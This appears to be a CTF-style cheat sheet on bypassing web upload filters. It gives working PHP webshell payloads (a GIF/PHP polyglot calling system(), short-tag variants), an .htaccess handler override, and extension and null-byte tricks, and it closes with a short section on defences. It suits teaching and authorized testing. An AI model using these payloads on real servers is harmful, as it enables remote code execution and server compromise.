# File upload bypass

An upload form is only dangerous if you can upload something that runs. The game
is getting a file the server will *execute* (a webshell) past whatever checks are
in place. So first, figure out what's actually checked, then defeat that layer.

All examples are generic. Nothing here is the solution to a specific challenge.

## 1. What gets checked

Usually one or more of:

- **extension** — client- or server-side allow/deny list
- **Content-Type** (MIME) — the header the browser sends
- **magic bytes** — the first bytes of the file (e.g. `GIF89a`, `\xFF\xD8` for JPEG)
- **content** — a scan for `<?php`, or an image re-encode
- **size**, filename, sometimes dimensions

Each one is a separate thing to bypass. Upload a normal image first and watch the
request/response in Burp to see what passes.

## 2. Extension tricks

When the filter is on the extension:

- **double extension** — `shell.php.jpg`, or `shell.jpg.php` if only the last is
  checked.
- **alternate PHP extensions** — `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`,
  `.pht`, `.phar`. A deny-list that only blocks `.php` misses these.
- **case** — `shell.PhP` against a case-sensitive deny-list.
- **trailing char** — `shell.php.` or `shell.php%20` / `shell.php%00` (null byte,
  old stacks) where the suffix is trimmed after the check.

The alternate extension only helps if the server is configured to execute it, so
try a few.

## 3. MIME / Content-Type

If it only trusts the `Content-Type` header, just lie. Keep your `.php` body and
set:

```
Content-Type: image/jpeg
```

Done in Burp by editing the multipart part's header.

## 4. Magic bytes & polyglots

If the server checks the first bytes (or uses `getimagesize`), make the file
*look* like an image but still hold code:

```
GIF89a;
<?php system($_GET[0]); ?>
```

`GIF89a` satisfies the image check; PHP ignores the leading text and runs the
code — a GIF/PHP polyglot. You can do the same inside a real JPEG's comment/EXIF.

## 5. The .htaccess trick

If `.php` is blocked but you can upload arbitrary files into a directory Apache
serves, upload an `.htaccess` that makes a harmless extension execute as PHP:

```
# .htaccess
AddType application/x-httpd-php .xyz
```

Then upload `shell.xyz` — it now runs as PHP.

## 6. Content filters

If the content is scanned for `<?php`:

- short tags: `<?=system($_GET[0]);?>`
- `<script language="php">system($_GET[0]);</script>` on old PHP
- break the string so a naive grep misses it.

## 7. From upload to RCE

Finding where it landed is half the battle: check the response for a path, guess
`/uploads/`, or read the source (via LFI) to find the save directory. Then just
hit your shell:

```
/uploads/shell.php?0=id
```

## 8. Defending

- **Whitelist** extensions, and validate the real content server-side
  (`finfo`/`getimagesize`), not the client's Content-Type.
- **Rename** uploads to a random name with a fixed safe extension.
- **Store outside the web root**, or in a directory where execution is disabled
  (`php_admin_flag engine off`, no handler), and block `.htaccess`.
- **Re-encode images** so embedded code is destroyed.

---

Built by **White** · [github.com/white-exee](https://github.com/white-exee)
